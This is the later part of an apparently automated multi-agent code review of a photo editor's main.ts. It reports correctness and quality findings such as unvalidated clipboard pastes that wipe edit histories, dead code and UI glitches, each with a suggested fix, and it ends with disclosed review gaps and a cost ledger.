- Severity: **Suggestion** · Confidence: low · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `const ops = JSON.parse(text) as Op[];`

**What's wrong.** Found by the verifier while tracing R1-1, outside the original candidate set. main.ts:5528-5546 does JSON.parse(text) as Op[], checks only Array.isArray, then calls persistEdits(id, commitEdit(state, ops)) for every target - writing unvalidated ops to IndexedDB. On the next loadEditState those rows fail isValidEditRow and fall back to createEditState(), so the target photos lose their entire edit history with no warning. This is the same failure mode as R1-1 reached from a different boundary, and R1-1's fix (validate at the write boundary, or reject per-op rather than per-row) closes both. The clipboard is a genuinely untrusted source: it can hold JSON from another app, a truncated copy, or a payload from a shared preset.

**Failure scenario.** The user copies settings from a photo, switches to another app which overwrites the clipboard with unrelated JSON that happens to be an array, switches back and pastes onto 20 selected photos. All 20 rows are written with invalid ops. On the next load every one of them falls back to createEditState() and the 20 photos' edit histories are gone, silently.

**Witness.** not run - identified by the verifier as an out-of-candidate observation and quoted from src/main.ts:5528-5546; it was not independently probed. The mechanism it depends on IS witnessed: the R1-1 probe showed isValidEditRow returning false for a row containing one rejected op, and editsStore.ts:15 shows the createEditState() fallback.

**Suggested fix.** Validate before persisting: `const ops = JSON.parse(text); if (!Array.isArray(ops) || !ops.every(isValidOp)) { showError('The clipboard does not hold valid Candela settings.'); return; }`. Export isValidOp from editsStore.ts if it is not already. Better, make the load path reject per-op rather than per-row so a single bad op cannot discard a whole history.

**Fix witness (acceptance criterion).** A test that pastes an array containing one invalid op and asserts no row is written (or that the valid ops survive). Must go red if the Array.isArray-only check is restored.

**Fix constraint.** The fix must not reject the legitimate cross-photo case - maskFromJson converts a serialized dodgeBurn mask back to an Int8Array (src/catalog/presetFiles.ts uses it before isValidOp), so validation has to run AFTER that conversion or valid pasted masks will be refused.
### Nice to have (6)

#### R1-41 — `src/main.ts:374`

**showError always exposes the 'See detail' disclosure even…**

- Severity: **Nice to have** · Confidence: high · Source: `[review]` · Category: quality · Direction: certifies-falsely
- Anchor: `errorDetailEl.textContent = detail ?? '';`

**What's wrong.** errorDetailEl.textContent = detail ?? '' blanks the <pre id=error-detail>, but its wrapper <details> See detail (index.html:2750-2753) is a static sibling that showError never touches. Seven call sites pass no detail at all (1475, 1483, 1493, 2208, 3134, 3781, 5901). The <details> also keeps its open/closed state across errors, so an error WITH detail that the user expanded leaves the disclosure open for the next, detail-less error. clearError should reset the same two properties.

**Failure scenario.** A photo is missing from disk -> showError(missingFileCopy(record.name)) at 2208 -> the alert reads 'This photo is missing from disk - ...' followed by a clickable 'See detail' that expands to a completely empty box, so the user concludes the app swallowed the diagnostic. Same for 'Nothing to sync...' (5901) and all three GPU-device-lost messages.

**Witness.** not run - established by reading showError/clearError against index.html:2748-2754 and enumerating the seven detail-less call sites; no probe was written.

**Suggested fix.** In showError: `const disclosure = errorDetailEl.closest('details'); if (disclosure) { disclosure.hidden = !detail; disclosure.open = false; }`. Reset the same two properties in clearError.

**Fix witness (acceptance criterion).** N/A - a DOM-visibility tweak; the check is that a detail-less showError renders no 'See detail' affordance.

---

#### R1-37 — `src/main.ts:2264`

**updateFooter fills a rating tally from the visible scope…**

- Severity: **Nice to have** · Confidence: high · Source: `[review]` · Category: quality · Direction: fails-closed
- Anchor: `const counts = [0, 0, 0, 0, 0, 0];`

**What's wrong.** counts is filled by `for (const f of scope) counts[f.rating ?? 0]++;` and then never used - the chip badges and titles below read scopeRating[min] and scopeTotal, populated by tallyScope in rebuildGrid. updateFooter runs on every repaintGrid and again on every render-queue success/failure (2446, 2392). It is also a live trap: counts is the POST-cull distribution while scopeRating is deliberately the PRE-cull one (comment at 1620-1626), so anyone 'fixing' the chips to read counts would silently re-introduce the bug that comment describes.

**Failure scenario.** A 100k-photo All-folders view: every star keypress walks 100k records twice - once here, once in tallyScope - and throws one result away. The cost is a visible hitch on the app's most-used interaction for zero benefit, and the dead variable invites a future change that regresses a documented fix.

**Witness.** not run - the deciding fact is that `counts` has no read site after its fill loop, established by reading updateFooter in full and grepping its body; no probe was written.

**Suggested fix.** Delete both lines.

**Fix witness (acceptance criterion).** N/A - removing dead code adds no guard, branch or behaviour for a test to pin; the existing footer-count assertions in scripts/qa-loop.mjs are the regression net.

---

#### R1-38 — `src/main.ts:3982`

**perfMarks.decodeStart/decodeEnd are never assigned, so…**

- Severity: **Nice to have** · Confidence: high · Source: `[review]` · Category: quality · Direction: certifies-falsely
- Anchor: `decodeStart: 0,`

**What's wrong.** The only writes to perfMarks are renderStart (2499) and renderEnd (2543). decodeStart/decodeEnd are initialised to 0 and never touched, and logPerformance() subtracts them unconditionally. The real decode timing is logged separately in loadIntoPipeline's own performance.now() deltas ('decode+demosaic: ...ms'), so this object is a duplicate instrumentation path that silently reports zero.

**Failure scenario.** Someone chasing the ~1.6s LibRaw decode presses Ctrl+Shift+P and reads '[perf] decode: 0.0ms, render: 12.3ms', concludes the decode is free, and looks for the jank in the render path instead. The instrument lies in the direction that sends the investigation the wrong way.

**Witness.** not run - established by grepping every write to perfMarks (2499, 2543 only) against its four declared fields; no probe was written.

**Suggested fix.** Delete decodeStart/decodeEnd and the decodeTime line from logPerformance() (loadIntoPipeline's console log already covers decode), or set them around `await decode(fileBytes)` / `await decodeImage(fileBytes)` if one combined readout is wanted.

**Fix witness (acceptance criterion).** N/A - removing or wiring dead instrumentation adds no behaviour a test can pin; the Ctrl+Shift+P readout is the check.

---

#### R1-40 — `src/main.ts:4408`

**The navigator's black letterband fill is immediately wiped…**

- Severity: **Nice to have** · Confidence: high · Source: `[review]` · Category: quality · Direction: fails-closed
- Anchor: `navCtx.fillRect(0, 0, navCanvas.width, navCanvas.height);`

**What's wrong.** navCtx.fillStyle = '#000'; navCtx.fillRect(...) runs, then navCtx.clearRect(0, 0, navCanvas.width, navCanvas.height) resets the same rect to transparent immediately before the drawImage. The bands appear black only because .navigator { background: #000 } (index.html:1508) shows through the transparent canvas. Related: line 4414 allocates a fresh scratch canvas plus a 2D context inside the `do { ... } while (navRenderPending)` loop, so each latest-wins repaint builds a new element and backing store (up to 448px wide) instead of reusing one - pure GC churn on the hottest interactive path in the Develop panel.

**Failure scenario.** No behavioural failure today. The moment the navigator panel gets a non-black background the letterbands turn transparent and the stated intent (paint them black) is silently gone. Meanwhile a slider drag repaints the navigator on every committed frame, each allocating an element, a context and a backing store.

**Witness.** not run - established by reading the fill/clear pair in sequence and the CSS at index.html:1508; no probe was written.

**Suggested fix.** Delete the clearRect and keep the black fill (the fill then IS the letterband), or delete the fill and keep the clearRect - not both. Separately, hoist one scratch canvas and context next to navCtx in the enclosing block and reset only its width/height per repaint.

**Fix witness (acceptance criterion).** N/A - the change is behaviour-preserving by construction; the visual check is that the letterbands stay black with the panel background temporarily set to another colour.

---

#### R1-39 — `src/main.ts:4887`

**The grid-1x4 branch is unreachable - count is…**

- Severity: **Nice to have** · Confidence: high · Source: `[review]` · Category: quality · Direction: fails-closed
- Anchor: `else container.classList.add(count === 4 ? 'grid-2x2' : 'grid-1x4');`

**What's wrong.** The ternary's false arm can never be taken. It reads as if 5+ selections get a 1x4 layout when in fact they get 2x2 with only the first four photos, so the dead branch hides that the extra selections are silently dropped from the Compare/Contact view.

**Failure scenario.** No runtime failure today. The cost is that the next reader believes 5+ selections are laid out 1x4 and reasons from that, and the silent drop of selections beyond four is invisible in the code that appears to handle it.

**Witness.** not run - established by reading the enclosing function's early return (selectedIds.length < 2) and the count = Math.min(selectedIds.length, 4) clamp, then enumerating the reachable values against the preceding branches; no probe was written.

**Suggested fix.** `else container.classList.add('grid-2x2');` - or, if 1x4 was meant for 5+ selections, raise the Math.min(..., 4) cap and key the class off the real count.

**Fix witness (acceptance criterion).** N/A - the branch is unreachable, so no test can pin it; the fix is verified by tsc plus a read of the remaining arms.

---

#### R1-42 — `src/main.ts:3781`

**The only user-visible Thai string in an otherwise…**

- Severity: **Nice to have** · Confidence: low · Source: `[review]` · Category: quality · Direction: fails-closed
- Anchor: `showError('ไม่สามารถเปิดหน้าต่างควบคุมได้ - อาจถูก popup blocker บล็อก');`

**What's wrong.** The other two Thai occurrences in the file (899, 941) are inside comments quoting bug reports. Every neighbouring showError in this range is English ("Couldn't extract the camera JPEG - ...", 'Select a photo first', 'Export failed.'), and index.html carries no Thai copy either.

**Failure scenario.** An English-reading user (or a collaborator testing the Second Monitor path) with popups blocked clicks the button and gets an unreadable error for exactly the case where the message is the only clue about what to do - re-enable popups.

**Witness.** not run - established by grepping the file for non-ASCII user-facing strings and confirming the other two hits are comments; no probe was written.

**Suggested fix.** showError("Couldn't open the controls window - your browser's popup blocker may have stopped it.")

**Fix witness (acceptance criterion).** N/A - a copy change.

## Not reviewed / disclosed gaps

No chunk was uncoverable (there were no chunks) and no `skippedFiles` entry exists. Every line of `src/main.ts` 1–6,625 was read by a territory agent. The following were disclosed by agents as checks they could not finish at their tool budget; none is an incomplete **required** trace, so none withholds the verdict — but they are scope this round did not close:

- **`FileSystemFileHandle.remove()` platform behaviour** — whether Chrome ships it, and whether it trashes or unlinks, is not settleable from this repo. This is what keeps R1-29 at low confidence; its severity turns on the answer.
- **GPUDevice GC-reclaimability** (R1-11) — a browser-runtime property; the verdict rests on `destroy()` never being called and `destroy()` not calling `device.destroy()`, not on a measured leak.
- **46 of 58 `catch` blocks** in `main.ts` were not individually read by the cross-module tracer (12 were, plus the shared classifier); the remainder are export/preset/IDB/collection paths unlikely to touch a file handle.
- **`scripts/qa-loop.mjs` lines 1115–1660 and 1840–2095** were not read in full by the coverage agent; it confirmed by targeted grep that none contains `undo`, `redo`, `#history`, `apply-preset`, `shiftKey`, `destroy` or a multi-file export. `harness.ts` / `harness.html` were not opened, so the coverage findings rest on `qa-loop.mjs` alone.
- **`src/catalog/collections.ts`, `missing.ts`, `keywords.ts`, `editsStore.ts`, `culling.ts`** were taken as correct on the strength of their call sites by one territory agent rather than independently confirmed (two of them were later read in full by the verifiers).
- **Perf thresholds unmeasured** — R1-24 and R1-25 are severity-ruled Suggestion, not Critical, precisely because no browser run was permitted to measure an actual hang.
- Not assessed: whether `isValidOp` validates a restored `toneCurve.points` array (odd-length/NaN through `isLinearCurve`); whether `renderSurvey` re-tiles on window resize; the `createBackupModule` options object against `catalog/backup.ts`'s interface; every writer of `getState().selectedIds` beyond `pruneSelectionToVisible`.

## Cost ledger

```
Cost ledger: 413 model calls · 28.4M input (94% cached) · 548k output (311k thinking) · 98 min wall
  main loop: 31 calls · 7.5M in · 112k out
  agent runs: 13
    review-agent-call_d8b6e9f793544a54a17da372: 80 calls · 4.8M in · 47k out
    review-agent-call_dec0cd3f4cad4681ae042c19: 58 calls · 3.9M in · 52k out
    review-agent-call_fab1cb7b9b3c4912b7623d38: 46 calls · 3.0M in · 29k out
    review-agent-call_ae71913a3c1f444481f0b5f5: 25 calls · 1.5M in · 38k out
    review-agent-call_08ed4f62b2934588af1bf0d5: 26 calls · 1.4M in · 44k out
    review-agent-call_73780a15a81d4970bd2ca1b6: 23 calls · 1.1M in · 38k out
    review-agent-call_27648ee481e540b491d226bb: 20 calls · 1.0M in · 26k out
    review-agent-call_6342e415957c491f9136ab07: 24 calls · 1.0M in · 32k out
    …and 5 more agents · 3.1M in combined
```

Full per-agent detail: `.qwen/reviews/2026-09-27-182009-src_main.ts-cost-ledger.json`.

## Note on the review shape

`qwen review emit-workflow` refused this plan (`agent-prompt: the plan has no chunks[]`), which is expected for the no-diff branch of a file review — Step 1 prescribes handing every agent the file's absolute path instead of a diff range. The medium fan-out was therefore dispatched manually: seven territory agents over contiguous line ranges (1–560, 561–1105, 1106–1960, 1961–3120, 3121–4260, 4261–5310, 5311–6625), each folding in the correctness / language-pitfall / security / quality / performance dimensions for its range, plus three whole-file lenses (cross-module tracer, test coverage, build & test). That is 10 finder agents, matching medium's roster for a file-path review. Out-of-range observations were routed between waves rather than dropped, and each routed item was independently re-verified — one was confirmed (the `dispScale` copies at 3639/3663), one was rejected (the `getContext` claim at 4813).
